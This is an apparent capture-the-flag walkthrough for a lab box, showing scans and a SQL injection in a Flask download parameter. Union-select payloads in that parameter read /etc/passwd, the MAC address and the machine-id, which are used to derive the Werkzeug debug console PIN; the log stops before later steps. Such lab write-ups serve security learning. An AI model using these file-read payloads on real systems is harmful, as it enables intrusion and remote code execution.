# The Bandit Surfer
## Difficulty Hard

## NMAP
```bash
nmap -sC -sV 10.201.123.31 -oN nmap_report
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 10:59 WIB
Nmap scan report for 10.201.123.31
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d0:49:f0:99:d2:8d:e4:95:7c:aa:98:f2:42:67:64:b9 (RSA)
|   256 49:9a:74:19:e4:8c:e1:34:49:64:0f:d1:81:f1:6b:1c (ECDSA)
|_  256 bc:39:5c:54:19:4b:fe:6f:09:33:da:c8:92:24:ee:2b (ED25519)
8000/tcp open  http    Werkzeug httpd 3.0.0 (Python 3.8.10)
|_http-title: The BFG
|_http-server-header: Werkzeug/3.0.0 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1068.76 seconds
```

## Enumeration
- Check `10.201.123.31:8000`
```bash
dirb http://10.201.123.31:8000/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Nov  4 11:29:36 2025
URL_BASE: http://10.201.123.31:8000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.201.123.31:8000/ ----
+ http://10.201.123.31:8000/console (CODE:200|SIZE:1563)                                                                                     
+ http://10.201.123.31:8000/download (CODE:200|SIZE:20) 
```
- Using BurpSuite when downloading an image by clicking on it
- Share to Repeter and edit id=5
- Send and found this
```html
/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py
```
- Edit id in BurpSuite earlier `5' UNION SELECT "file:///etc/passwd" -- -`
- Select that id right click and convert to url encode key character
- Send
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
mcskidy:x:1000:1000::/home/mcskidy:/bin/bash
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

- Edit id `5'+UNION+SELECT+"file%3a///sys/class/net/eth0/address"+--+-`
```
16:ff:ec:8e:f7:03
```
```python
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information

>>> print(0x16ffec8ef703)
25288441263875

```
- In url browser `http://10.201.123.31:8000/download?id=2`
```

File "/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py", line 1478, in __call__

return self.wsgi_app(environ, start_response)

File "/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py", line 1458, in wsgi_app

response = self.handle_exception(e)

File "/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py", line 1455, in wsgi_app

response = self.full_dispatch_request()

File "/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py", line 869, in full_dispatch_request

rv = self.handle_user_exception(e)

File "/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py", line 867, in full_dispatch_request

rv = self.dispatch_request()

File "/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py", line 852, in dispatch_request

return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)

File "/home/mcskidy/app/app.py", line 28, in download

cur.execute(query)

File "/home/mcskidy/.local/lib/python3.8/site-packages/MySQLdb/cursors.py", line 179, in execute

res = self._query(mogrified_query)

File "/home/mcskidy/.local/lib/python3.8/site-packages/MySQLdb/cursors.py", line 330, in _query

db.query(q)

File "/home/mcskidy/.local/lib/python3.8/site-packages/MySQLdb/connections.py", line 255, in query

_mysql.connection.query(self, query)
```
- Edit id in BurpSuite like this `5%27%20UNION%20SELECT%20%27file:///etc/machine-id%27%20--%20-`
```
aee6189caee449718070b58132f2e4ba
```
- Create exploit.py from `https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html`
- Modified 
- And Exploit
```bash
python3 exploit.py
280-354-418
```
## SORRY THE NEXT STEPS WERE NOT CAPTURED